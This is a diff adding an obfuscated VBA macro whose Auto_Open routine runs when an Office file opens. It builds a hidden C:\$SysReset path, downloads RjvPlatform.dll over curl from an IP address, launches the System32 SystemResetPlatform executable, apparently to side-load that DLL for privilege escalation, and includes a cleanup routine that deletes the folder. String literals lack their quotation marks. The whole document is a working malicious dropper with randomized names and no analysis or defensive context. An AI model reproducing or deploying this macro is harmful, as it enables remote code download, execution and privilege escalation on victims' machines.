@@ -1,0 +1,29 @@
+
+Sub Auto_Open()
+Call oqWlxdQqUhHJj(C:\$SysReset\Framework\Stack)
+Set XjcHGNRSbhHWtT = CreateObject(WScript.Shell)
+If Dir(C:\$SysReset\Framework\Stack\RjvPlatform.dll, vbDirectory) = vbNullString Then
+aaaa = curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll
+Set YCHojjpcsJKhWy = XjcHGNRSbhHWtT.Exec(aaaa)
+End If
+Application.Wait (Now + TimeValue(0:00:03))
+Set dMNDiRhQIZpAW = XjcHGNRSbhHWtT.Exec(C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe)
+Application.Wait (Now + TimeValue(0:00:05))
+
+End Sub
+
+Function oqWlxdQqUhHJj(ZYTQZCTTBaEkED As String)
+Dim evJKMFEwbAMKgYE As Variant
+Dim rYVCmtSYBYZPx As String
+rYVCmtSYBYZPx = ""
+For Each evJKMFEwbAMKgYE In Split(ZYTQZCTTBaEkED, \)
+rYVCmtSYBYZPx = rYVCmtSYBYZPx & evJKMFEwbAMKgYE & \
+If Len(Dir(rYVCmtSYBYZPx, vbDirectory)) = 0 Then MkDir rYVCmtSYBYZPx
+Next
+End Function
+
+Function oMfgsdBRssppVPy()
+If Dir(C:\$SysReset\Framework\Stack, vbDirectory) <> vbNullString Then
+CreateObject(Scripting.FileSystemObject).DeleteFolder C:\$SysReset
+End If
+End Function
